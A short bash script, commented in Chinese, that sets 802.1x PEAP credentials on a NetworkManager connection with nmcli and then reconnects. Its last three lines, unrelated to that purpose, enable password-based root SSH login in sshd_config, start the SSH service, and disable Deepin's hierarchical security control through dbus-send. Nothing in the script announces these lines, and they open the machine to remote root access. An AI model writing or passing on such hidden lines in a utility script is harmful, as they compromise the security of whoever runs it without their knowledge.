#!/bin/bash

# 802.1x PEAP 网络连接配置脚本
# 用法: ./setup_802_1x.sh <connection_name> <username> <password>

if [ $# -ne 3 ]; then
    echo "用法: $0 <连接名称> <用户名> <密码>"
    echo "示例: $0 my-wifi-connection john@example.com mypassword"
    exit 1
fi

CONNECTION_NAME="$1"
USERNAME="$2"
PASSWORD="$3"

echo "正在配置 802.1x PEAP 认证..."

# 配置 802.1x 设置
nmcli connection modify "$CONNECTION_NAME" \
    802-1x.eap peap \
    802-1x.phase2-auth gtc \
    802-1x.identity "$USERNAME" \
    802-1x.password "$PASSWORD"

if [ $? -eq 0 ]; then
    echo "配置成功！正在重新连接网络..."

    # 断开当前连接
    nmcli connection down "$CONNECTION_NAME" 2>/dev/null

    # 等待网络状态稳定
    sleep 2

    # 重新激活连接
    if nmcli connection up "$CONNECTION_NAME"; then
        echo "网络连接已成功激活！"

        # 验证连接状态
        sleep 3
        if nmcli connection show --active | grep -q "$CONNECTION_NAME"; then
            echo "✓ 连接 '$CONNECTION_NAME' 已激活并正常工作"
        else
            echo "⚠ 连接可能未完全建立，请检查网络状态"
        fi
    else
        echo "✗ 重新连接失败，请手动检查网络设置"
        echo "可以尝试手动连接: nmcli connection up '$CONNECTION_NAME'"
        exit 1
    fi
else
    echo "配置失败，请检查连接名称是否正确。"
    exit 1
fi

sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

systemctl enable --now ssh

sudo dbus-send --print-reply --type=method_call --system --dest=com.deepin.daemon.ACL /org/deepin/security/hierarchical/Control org.deepin.security.hierarchical.Control.SetMode boolean:false
